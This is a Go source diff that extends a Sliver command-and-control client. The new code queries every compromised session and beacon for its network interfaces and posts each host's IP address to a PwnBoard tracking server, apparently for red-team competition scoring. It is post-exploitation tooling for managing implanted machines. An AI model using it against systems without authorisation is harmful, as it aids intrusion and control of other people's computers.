@@ -1,13 +1,16 @@
 package main
 
 import (
+	"bytes"
 	"container/list"
 	"context"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
+	"net/http"
 	"os"
 	"strings"
 	"time"
@@ -21,6 +24,40 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
+
+type PwnBoard struct {
+	IPs  string `json:"ip"`
+	Type string `json:"type"`
+}
+
+func updatepwnBoard(ip string) {
+	url := os.Getenv("pwnboard")
+	if url == "" {
+		url = "http://127.0.0.1"
+	}
+	url = url + "/pwn/boxaccess"
+	// Create the struct
+	data := PwnBoard{
+		IPs:  ip,
+		Type: "sliver",
+	}
+
+	// Marshal the data
+	sendit, err := json.Marshal(data)
+	if err != nil {
+		fmt.Println("\n[-] ERROR SENDING POST:", err)
+		return
+	}
+
+	// Send the post to pwnboard
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
+	if err != nil {
+		fmt.Println("[-] ERROR SENDING POST:", err)
+		return
+	}
+	println(resp.StatusCode)
+	defer resp.Body.Close()
+}
 
 type task struct {
 	taskid string
@@ -59,6 +96,7 @@ func main() {
 	var hostss string
 	var sessionss string
 	var listsessions bool
+	var pwnboard bool
 	flag.StringVar(&configPath, "config", "", "path to sliver client config file")
 	flag.StringVar(&command, "command", "", "command to run")
 	flag.StringVar(&argss, "args", "", "command args")
@@ -68,6 +106,7 @@ func main() {
 	flag.StringVar(&hostss, "beacons", "", "runs command on list of beacons")
 	flag.StringVar(&sessionss, "sessions", "", "runs command on list of sessions")
 	flag.BoolVar(&listsessions, "listsessions", false, "get a list of all sessions names")
+	flag.BoolVar(&pwnboard, "pwnboard", false, "push to pwn board, populate the pwnboard env var if you dont want to send to localhost")
 	flag.Parse()
 	var args []string
 	var hosts []string
@@ -98,7 +137,9 @@ func main() {
 	log.Println("[*] Connected to sliver server")
 	defer ln.Close()
 	//command = "ls"
-	if rename == true {
+	if pwnboard == true {
+		sendtopwnboard(rpc)
+	} else if rename == true {
 		renameall(rpc)
 	} else if runonnew == true {
 		runcommandonnew(rpc, command, args)
@@ -225,12 +266,13 @@ func renameall(rpc rpcpb.SliverRPCClient) {
 		})
 		if err != nil {
 			log.Print(err)
+			continue
 		}
 		println(agents.Sessions[i].Name + "," + agents.Sessions[i].Hostname)
 		for g := 0; g < len(ifconfig.NetInterfaces); g++ {
 			if ifconfig.NetInterfaces[g].Name != "lo" {
 				for k := 0; k < len(ifconfig.NetInterfaces[g].IPAddresses); k++ {
-					if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") {
+					if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") && !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], "172.17.0.1") {
 						println(ifconfig.NetInterfaces[g].IPAddresses[k])
 						ipaddr := ifconfig.NetInterfaces[g].IPAddresses[k]
 						ipaddr = strings.Split(ipaddr, "/")[0]
@@ -321,7 +363,7 @@ func renameall(rpc rpcpb.SliverRPCClient) {
 						for g := 0; g < len(ifconfig.NetInterfaces); g++ {
 							if ifconfig.NetInterfaces[g].Name != "lo" {
 								for k := 0; k < len(ifconfig.NetInterfaces[g].IPAddresses); k++ {
-									if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") {
+									if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") && !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], "172.17.0.1") {
 										println(ifconfig.NetInterfaces[g].IPAddresses[k])
 										ipaddr := ifconfig.NetInterfaces[g].IPAddresses[k]
 										ipaddr = strings.Split(ipaddr, "/")[0]
@@ -332,6 +374,152 @@ func renameall(rpc rpcpb.SliverRPCClient) {
 											Name:     name,
 										})
 
+										if err != nil {
+											log.Print("Failed to decode task response: %s\n", err)
+
+										}
+									}
+								}
+							}
+						}
+						//println(string(resp.Response))
+					}
+				}
+			}
+			if i == nil {
+				println("i think i got everyone")
+				break
+			}
+		}
+
+	}
+	for i := taskids.Front(); i != nil; i = i.Next() {
+		println("didnt hear from " + (i.Value).(task).beacon.Name + "," + (i.Value).(task).beacon.Hostname)
+	}
+
+}
+func sendtopwnboard(rpc rpcpb.SliverRPCClient) {
+	agents, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
+	if err != nil {
+		log.Fatal(err)
+	}
+	for i := 0; i < len(agents.Sessions); i++ {
+		ifconfig, err := rpc.Ifconfig(context.Background(), &sliverpb.IfconfigReq{
+			Request: makeRequest(agents.Sessions[i]),
+		})
+		if err != nil {
+			log.Print(err)
+			continue
+		}
+		println(agents.Sessions[i].Name + "," + agents.Sessions[i].Hostname)
+		for g := 0; g < len(ifconfig.NetInterfaces); g++ {
+			if ifconfig.NetInterfaces[g].Name != "lo" {
+				for k := 0; k < len(ifconfig.NetInterfaces[g].IPAddresses); k++ {
+					if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") && !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], "172.17.0.1") {
+						println(ifconfig.NetInterfaces[g].IPAddresses[k])
+						ipaddr := ifconfig.NetInterfaces[g].IPAddresses[k]
+						ipaddr = strings.Split(ipaddr, "/")[0]
+						name := ipaddr + "_" + agents.Sessions[i].Hostname + "."
+						println(name)
+
+						// _, err := rpc.Rename(context.Background(), &clientpb.RenameReq{
+						// 	SessionID: agents.Sessions[i].ID,
+						// 	Name:      name,
+						//})
+						updatepwnBoard(ipaddr)
+						//todo upload to pwnboard
+						if err != nil {
+							log.Print("Failed to decode task response: %s\n", err)
+
+						}
+					}
+				}
+			}
+		}
+
+	}
+
+	beacons, err := rpc.GetBeacons(context.Background(), &commonpb.Empty{})
+	if err != nil {
+		log.Fatal(err)
+	}
+	taskids := list.New()
+	for i := 0; i < len(beacons.Beacons); i++ {
+		if beacons.Beacons[i].IsDead == true {
+			println(beacons.Beacons[i].Hostname + " is dead")
+		} else {
+
+			ifconfig, err := rpc.Ifconfig(context.Background(), &sliverpb.IfconfigReq{
+				Request: makeBeaconRequest(beacons.Beacons[i]),
+			})
+			if err != nil {
+				log.Print(err)
+			}
+			taskids.PushFront(task{taskid: ifconfig.Response.TaskID, beacon: beacons.Beacons[i]})
+		}
+	}
+
+	for k := 0; k < 100; k++ {
+		if taskids.Front() == nil {
+			continue
+		}
+		log.Println("waiting 10 seconds")
+		time.Sleep(10 * time.Second)
+		for i := taskids.Front(); i != nil; i = i.Next() {
+
+			tasks, err := rpc.GetBeaconTasks(context.Background(), (i.Value).(task).beacon)
+
+			if err != nil {
+				log.Print(err)
+			}
+			for j := 0; j < len(tasks.Tasks); j++ {
+				if tasks.Tasks[j].State == "completed" {
+					if tasks.Tasks[j].ID == (i.Value).(task).taskid {
+						resp, err := rpc.GetBeaconTaskContent(context.Background(), tasks.Tasks[j])
+						if err != nil {
+							log.Print(err)
+						}
+						oldval := i.Value
+						old := i.Prev()
+						if old == nil {
+							println("HELP")
+							if i.Next() == nil {
+								taskids.Remove(i)
+								i = nil
+							} else {
+								taskids.MoveToFront(i.Next())
+								taskids.Remove(i)
+								i = taskids.Front()
+							}
+
+						} else {
+							taskids.Remove(i)
+							i = old
+						}
+
+						ifconfig := &sliverpb.Ifconfig{}
+						err = proto.Unmarshal(resp.Response, ifconfig)
+						if err != nil {
+							log.Print("Failed to decode task response: %s\n", err)
+
+						}
+
+						println((oldval).(task).beacon.Name + "," + (oldval).(task).beacon.Hostname)
+						for g := 0; g < len(ifconfig.NetInterfaces); g++ {
+							if ifconfig.NetInterfaces[g].Name != "lo" {
+								for k := 0; k < len(ifconfig.NetInterfaces[g].IPAddresses); k++ {
+									if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") && !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], "172.17.0.1") {
+										println(ifconfig.NetInterfaces[g].IPAddresses[k])
+										ipaddr := ifconfig.NetInterfaces[g].IPAddresses[k]
+										ipaddr = strings.Split(ipaddr, "/")[0]
+										name := ipaddr + "_" + (oldval).(task).beacon.Hostname + "."
+										println(name)
+										// _, err := rpc.Rename(context.Background(), &clientpb.RenameReq{
+										// 	BeaconID: (oldval).(task).beacon.ID,
+										// 	Name:     name,
+										// })
+
+										updatepwnBoard(ipaddr)
 										if err != nil {
 											log.Print("Failed to decode task response: %s\n", err)
 
